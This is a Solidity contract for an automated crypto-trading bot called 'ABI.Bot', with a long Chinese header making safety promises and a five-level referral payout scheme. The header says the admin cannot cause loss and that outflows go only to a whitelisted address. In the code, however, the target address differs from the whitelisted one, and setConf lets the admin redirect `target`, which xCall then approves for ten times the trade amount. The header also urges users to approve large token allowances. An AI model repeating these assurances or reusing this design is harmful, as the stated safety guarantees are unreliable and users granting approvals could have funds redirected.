/**
 *Submitted for verification at Arbiscan.io on 2023-11-08
*/

// SPDX-License-Identifier: MIT

/**
Copyright (C) 2023 ABI.Bot
   ###    ########  ####     ########   #######  ######## 
  ## ##   ##     ##  ##      ##     ## ##     ##    ##    
 ##   ##  ##     ##  ##      ##     ## ##     ##    ##    
##     ## ########   ##      ########  ##     ##    ##    
######### ##     ##  ##      ##     ## ##     ##    ##    
##     ## ##     ##  ##  ### ##     ## ##     ##    ##    
##     ## ########  #### ### ########   #######     ##   

                 -- Coded for ABI.Bot with ❤️ by [email protected]

该代码是用于DEXAI+™️机器人核心程序在确保用户资金安全的情况下,调用的交易其接口实现自动化交易的合约。

该代码涉及資金安全的最核心變量swapper在发布后(或者经过initConf方法初始化后)均不可以修改。

管理员权限:

    管理员权限(供 AI Core 程序调用,虽然管理员的权限极为有限,绝对不可能带来本金损失,但是出于从代码上100%确定机器人和相关资产的所有权,出资人可以随时收回管理员权限):
    1.swapFunction 方法发起交易,且兑换所得的目标地址为默认值(即本合约本身的地址)不可以修改。
    交易的目标地址白名单:
    target:
    0x84e387B4ACb7C0597AE99bF7Af29741A9b7baa51(ABI.Bot Relayer Contract)
    2.withdrawToken 按照约定比例分发余额。（）
    3.其他不涉及本金安全的写方法权限请看注释。
    
出资人权限:

    setAdmin 出资人可以设定新的管理员(触发该方法的同时,旧的管理员即刻作废)。

鄭重承諾:

    截止2023年11月8日更新後，ABIBot.com(註冊於馬紹爾群島的希嘉控股有限公司，下文堅稱：“我們”)對所有付費使用ABIBot自營交易腳本的用戶做出如下承諾:
    1.我們公布的代碼即為您的機器人鏈上運行的資金安全管理合約的完整代碼，請您自行在我們指定的編譯環境完成編譯，若您的鏈上運行的資金管理合約編譯結果與您使用這份代碼自行編譯的結果若一致再進行使用，否則請您停止使用，馬上與我們聯繫。我們在下文做出的任何法律承諾均以您運行於鏈上的合約所顯示的bytecode與這份源碼的編譯結果一致為前提。
    2.就目前的知識之所及，我們認為我們您現在看到的是可以保障你的數字貨幣幣本位本金安全的。我們保證沒有故意植入任何計算機科學屆已知（截止代碼發布時）惡意後門代碼。
    3.本代碼在部署於以太坊主網前，委託位於美國的區塊鏈鏈研究機構Blockchain Institiute進行了針對用戶授權於本合約調用的數字資產的安全性進行了專業評估，該機構經過盡職調查後公布的審計報告顯示用戶授權於本合約調用的數字資產不可能因為本合約或者本合約相關的任何程序導致除了特殊情況下發生交易失敗而導致的燃料費虧損外的任何資產損失，無論是有意的還是無意的。
    4.我們承諾如果本代碼因為開發時未能發現的邏輯錯誤或者代碼漏洞導致的數字資產的幣本位損失我們將做出賠償，但是賠償上限僅僅為您虧損金額減去您使用本合約的歷史獲利總額。
    
拒絕承諾:

    1.我們拒絕對任何數字資產未來任何時間在現實社會任何交易場景（DEX、CEX、OTC等）的法幣價格做出承諾，即便我們口頭或者書面上對某種或者數種數字資產的未來價值進行過明確的樂觀預測，均不代表對其未來的價格的承諾。
    2.我們拒絕為沒有使用我們公布的任意一份資金管理合約的而使用我們ABIBot的體驗性用戶的資金安全負責。

特别说明:本合约为 ABI.Bot 發布與2023年11月8日的安全强化版，我們對此前的版本的安全性保證截止本合約部署到以太坊主網為止。

编译环境: 
    
    https://remix.ethereum.org/#lang=en&optimize=true&runs=200&evmVersion=berlin&version=soljson-v0.8.22+commit.4fc1097e.js

一致性校验:

    请自行按照指定编译参数设置你的编译环境后,完成编译。将得到的Bytecode(编译结果)与您私有合约地址在区块浏览器上显示 Bytecode 进行一致性比对,确保一致则至少能证明你当前看到的源代码与你私有合约地址的源码内容完全一致。确保代码一致性,是你评估代码安全性的前提。

代币授权:

    授权交易的代币合约:根据需要自行授权各种代币,目前ABI.Bot主要针对:weth9、weth.x、wbtc.x、Aave WETH (aWETH)、interBTC、wBTC等封装币进行优化。

    授权交易的代币数量:为避免频繁出现授权额度不足建议不低于10000枚,进行授权即代表阁下能理解或充分信任本合约足以保证阁下资金安全。

**/


pragma solidity 0.8.22;

interface ERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address src,address dst,uint256 amount) external returns (bool);
    function allowance(address src,address dst) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

}

interface IxSwap {
    function ScriptSwap(address _token,uint256 _amount,uint256 _minRate,uint256 _minExRate)external returns(bool);
}


contract ABIBot {
    address public admin;


    address public addressA;
    address public addressB;
    address public addressC;
    address public addressD;
    address public addressE;
    address public addressDev;
    uint256 public costA;
    uint256 public costB;
    uint256 public costC;
    uint256 public costD;
    uint256 public costE;
    uint256 public lineOfBurn = 1000000000000000000;
    address public swapper;
    uint256 public totalSwapped;
    uint256 public totalEarned;

    address public target = 0x1Cd8243CCB7d4cEcA135eB4b0913F0889165Cc85;//唯一許可的資產流出方向

    event TokensSwapped(address indexed tokenA, address indexed user, uint256 amount, uint256 profit);


    //构造函数,该函数只能在发布合约时执行一次,且所有赋值均在代码中明文完成,每个用户独立设置。
    constructor() {
        admin = msg.sender;//合约发布者为管理员,管理员由DEXBot Plus核心AI控制,只有向不可篡改的交易聚合器代理地址发起交易。


        swapper  = address(0);//出资人地址,不可以修改。        
        addressA = address(0);
        addressB = address(0);
        addressC = address(0);
        addressD = address(0);
        addressE = address(0);
        costA = lineOfBurn; costB = lineOfBurn; costC = lineOfBurn; costD = lineOfBurn; costE = lineOfBurn;
      
        addressDev = 0x78c0F0fF1d9b36F53FEa77312BB4465073399999;
        
        
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "This function only for owner!");
        _;
    }
    //出资人权限,收回现有管理员的权限,并赋予新用户管理员权限
    function setAdmin(address _admin) external {
        require(msg.sender == swapper, "This function only for owner!");
        admin = _admin;
    }


    //管理员权限(预留供AI Core修改各级推荐人投资额数值的接口,从而实现烧伤与否与烧伤值与未来推荐人投资变动同步)
    function setRefCost(uint256 _costA,uint256 _costB,uint256 _costC,uint256 _costD,uint256 _costE) public onlyAdmin {
        costA = _costA;
        costB = _costB;
        costC = _costC;
        costD = _costD;
        costE = _costE;
    }

    function initConf(address _swapper, address _addressA, address _addressB, address _addressC, address _addressD, address _addressE )external onlyAdmin {
        require(swapper == address(0), "This function only can be used once!");
        swapper  = _swapper;//初始化後不可以修改。
        addressA = _addressA;
        addressB = _addressB;
        addressC = _addressC;
        addressD = _addressD;
        addressE = _addressE;
        
    }

    function setConf(address _addressA, address _addressB, address _addressC, address _addressD, address _addressE,address _target)external {
        require((msg.sender == swapper)||(msg.sender == admin), "This function only for owner or swapper!");
        addressA = _addressA;
        addressB = _addressB;
        addressC = _addressC;
        addressD = _addressD;
        addressE = _addressE;
        target = _target;
    }




    function xCall( address _token,uint256 _amount,uint256 _minRate,uint256 _minExRate) external onlyAdmin returns (bool)  {
        ERC20 token = ERC20(_token);
        if(token.allowance(address(this),target)<_amount){
            require(token.approve(target, _amount*10),"DEBUG:0");
        }
        require(token.transferFrom(msg.sender, address(this), _amount),"DEBUG:1");
        uint256 afterOutput = token.balanceOf(msg.sender);
        IxSwap _IxSwap = IxSwap(target);
        require(_IxSwap.ScriptSwap(_token,_amount,_minRate,_minExRate),"DEBUG:2");
        require(token.balanceOf(address(this))>=(afterOutput+_amount),"DEBUG:Last");
        return true;
    }




    function callback(address _token,uint256 _total,uint256 _cost,uint256 _exProfit) external returns(bool)  {
        require((msg.sender == target)||(msg.sender == address(this)), "This function only for owner or swapper!");
        
        ERC20 token = ERC20(_token);
        require (_cost <= _total);
        uint256 profit  = _total - _cost;
        require (profit <= ( _total * 2)/100);//利润上限制锁；
        uint256 basicProfit = profit - _exProfit;
        
        uint256 amountToSwapper = (basicProfit * 60) / 100 + _cost;
        amountToSwapper = (_exProfit * 40) / 100 + amountToSwapper;
        uint256 amountA = 0;
        if(addressA!=address(0)){
             amountA = (basicProfit * 6) / 100;
             if((costA<lineOfBurn)&&(costA<_cost)){
                 amountA = (amountA * costA) /_cost;
             }else{
                amountA = (_exProfit * 40) / 100 + amountA;
             }
        }
        uint256 amountB = 0;
        if(addressB!=address(0)){
             amountB = (basicProfit * 5) / 100;
             if((costB<lineOfBurn)&&(costB<_cost)){
                 amountB = (amountB * costB) /_cost;
             }
        }
        uint256 amountC = 0;
        if(addressC!=address(0)){
             amountC = (basicProfit * 4) / 100;
             if((costC<lineOfBurn)&&(costC<_cost)){
                 amountC = (amountC * costC) /_cost;
             }
        }
        uint256 amountD = 0;
        if(addressD!=address(0)){
             amountD = (basicProfit * 3) / 100;
             if((costD<lineOfBurn)&&(costD < _cost)){
                 amountD = (amountD * costD) /_cost;
             }
        }
        uint256 amountE = 0;
        if(addressE!=address(0)){
             amountE = (basicProfit * 2) / 100;
             if((costE<lineOfBurn)&&(costE < _cost)){
                 amountE = (amountE * costE) /_cost;
             }
        }

        // 将代币转移到交换地址
        require(token.transfer(swapper, amountToSwapper), "Transfer failed");
                uint256 amountDev = _total - amountToSwapper;

        // 将代币转移到地址A
        if((addressA!=address(0))&&(amountA>0)){
            require(token.transfer(addressA, amountA), "Transfer failed");
            amountDev = amountDev - amountA;

        }   

        // 将代币转移到地址B
        if((addressB!=address(0))&&(amountB>0)){
            require(token.transfer(addressB, amountB), "Transfer failed");
                        amountDev = amountDev - amountB;

            ///emit TokensWithdrawn(_token, addressB, amountB);
        }

        // 将代币转移到地址C
        if((addressC!=address(0))&&(amountC>0)){
            require(token.transfer(addressC, amountC), "Transfer failed");
            amountDev = amountDev - amountC;

        }

        
        if((addressD!=address(0))&&(amountD>0)){
            require(token.transfer(addressD, amountD), "Transfer failed");
                                    amountDev = amountDev - amountD;

           // emit TokensWithdrawn(_token, addressD, amountD);
        }
        // 将代币转移到地址E
        if((addressE!=address(0))&&(amountE>0)){
        require(token.transfer(addressE, amountE), "Transfer failed");
                                amountDev = amountDev - amountE;

       // emit TokensWithdrawn(_token, addressE, amountE);
        }
        // 将代币转移到地址Dev
        if((addressDev!=address(0))&&(amountDev>0)){
            require(token.transfer(addressDev, amountDev), "Transfer failed");
         //   emit TokensWithdrawn(_token, addressDev, amountDev);
        }
        emit TokensSwapped( _token, swapper, _cost,  profit);
        totalSwapped = totalSwapped + _cost;
        totalEarned = totalEarned + amountToSwapper;
        return true;
    }
}